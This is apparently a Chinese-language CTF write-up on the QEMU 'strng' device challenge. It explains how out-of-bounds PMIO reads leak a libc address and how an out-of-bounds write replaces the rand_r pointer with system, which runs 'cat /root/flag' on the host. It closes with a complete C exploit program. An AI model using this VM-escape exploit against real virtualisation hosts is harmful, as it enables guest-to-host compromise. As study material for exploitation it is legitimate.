前置知识的描述，大佬已经讲述的很清楚了，去下方链接处查看即可，这里只是记录一下个人对于exp的理解

https://xz.aliyun.com/t/6618#toc-0

第一步是使用`strng_mmio_write`将`cat /root/flag`写入到`regs[2]`开始的内存处，以供后续的攻击链使用

```c
    mmio_write(8,0x20746163);  // cat 全是反着来的，注意这一点
    mmio_write(12,0x6f6f722f); // /roo
    mmio_write(16,0x6c662f74); // t/fa
    mmio_write(20,0x006761); // ag
```

对于此处写入regs[2]做一个解释，因为在`strng_mmio_write`函数中，在你输入的size=4时，会检测你第一个参数addr，调用的结果如上面分析。regs数组的类型是uint32_t，数组里4字节为一个元素，因为此处一开始是 8 二进制为 1000，在>>2后二进制为 10 也就是2，刚到写到了regs[2]。后续的12，16，20其实分别写到了regs[3]，regs[4]，regs[5]

![image-20201008175629067](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201008175629067.png)

第二步是进行一个越界读，读取`regs`数组后面的`srand`地址，根据偏移算出system地址

我们可以算出regs数组与srand地址之间的偏移为0x104

![image-20201008181632456](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201008181632456.png)

因为这是一个八字节的地址，而我们每次返回只能返回4字节，所以我们需要进行两次的越界读写，分别是0x108和0x104。

```c
    uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

	uint32_t pmio_arbread(uint32_t offset)
{
    pmio_write(pmio_base+0,offset); //这里其实就是对于opaque->addr写入你的offset，以方便read去读取
    return pmio_read(pmio_base+4);
}

	uint64_t srandom_addr=pmio_arbread(0x108);
    srandom_addr=srandom_addr<<32;
    srandom_addr+=pmio_arbread(0x104);
```

不过这里注意一点，虽然ida里面对于`strng_pmio_read`函数反汇编出来的结果是

```c
uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  uint32_t reg_addr; // edx

  result = -1LL;
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        reg_addr = opaque->addr;
        if ( !(reg_addr & 3) )
          result = opaque->regs[reg_addr >> 2]; //注意这里，对于opaque->addr进行了>>2的操作
      }
    }
    else
    {
      result = opaque->addr;
    }
  }
  return result;
}
```

但是实际上动调的时候，如下图，右移后又将其*4，相当于<<2回来了。所以我们不用对0x104，0x108进行<<2操作，直接写入就好

![image-20201008182742529](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201008182742529.png)

在获取到了srand函数的地址后，我们就可以通过计算算出libc基址，与此同时system地址也获得了。这时我们需要把rand_r的地址改成system地址。首先需要算出rand_r与regs数组的偏移

![image-20201008193759586](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201008193759586.png)

然后进行一次越界写操作，将system的地址覆盖进去

```c
uint32_t pmio_write(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}

void pmio_abwrite(uint32_t offset, uint32_t value)
{
    pmio_write(pmio_base+0,offset); // 将偏移值传给opaque->addr
    pmio_write(pmio_base+4,value); // 将system的地址存入srand的地址里
}
pmio_abwrite(0x114,system_addr&0xffffffff);
```

然后这里特别离谱的一点.......我动调的时候发现它这里还是进行无用功>>2后又*4，乘回去了。

```c
reg_addr = opaque->addr;
        if ( !(reg_addr & 3) )
        {
          idx = reg_addr >> 2;
            
opaque->regs[idx] = val;
```

最后只需要调用rand_r，将regs[2]作为参数就可以调用system("cat /root/flag")来读取。

exp如下：

```c
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdint.h>

unsigned char* mmio_mem;
uint32_t pmio_base=0xc050;


void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

uint32_t pmio_write(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}


uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

uint32_t pmio_arbread(uint32_t offset)
{
    pmio_write(pmio_base+0,offset);
    return pmio_read(pmio_base+4);
}

void pmio_abwrite(uint32_t offset, uint32_t value)
{
    pmio_write(pmio_base+0,offset);
    pmio_write(pmio_base+4,value);
}

int main(int argc, char *argv[])
{
    
    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);
 

    mmio_write(8,0x20746163);
    mmio_write(12,0x6f6f722f);
    mmio_write(16,0x6c662f74);
    mmio_write(20,0x006761);
    
    /*
    //2f62696e2f7368
    mmio_write(8,0x6e69622f);
    mmio_write(12,0x0068732f);
    */
    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 )
        die("I/O permission is not enough");


    // leaking libc address 
    uint64_t srandom_addr=pmio_arbread(0x108);
    srandom_addr=srandom_addr<<32;
    srandom_addr+=pmio_arbread(0x104);
    printf("leaking srandom addr: 0x%llx\n",srandom_addr);
    uint64_t libc_base= srandom_addr-0x3a8e0;
    uint64_t system_addr= libc_base+0x453a0;
    printf("libc base: 0x%llx\n",libc_base);
    printf("system addr: 0x%llx\n",system_addr);
    
    // overwrite rand_r pointer to system
    pmio_abwrite(0x114,system_addr&0xffffffff);

    mmio_write(0xc,0);

     
}
```

